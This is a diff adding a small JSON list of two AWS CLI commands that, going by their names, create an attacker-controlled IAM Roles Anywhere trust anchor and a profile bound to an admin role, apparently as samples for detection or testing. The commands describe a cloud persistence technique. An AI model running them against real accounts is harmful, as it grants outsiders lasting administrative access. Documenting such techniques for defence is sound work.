@@ -1,0 +1,4 @@
+[
+  "aws rolesanywhere create-trust-anchor --name AttackerAnchor --source sourceData={x509CertificateData=...},sourceType=CERTIFICATE_BUNDLE",
+  "aws rolesanywhere create-profile --name AttackerProfile --role-arns arn:aws:iam::ACCOUNT:role/AdminRole"
+]
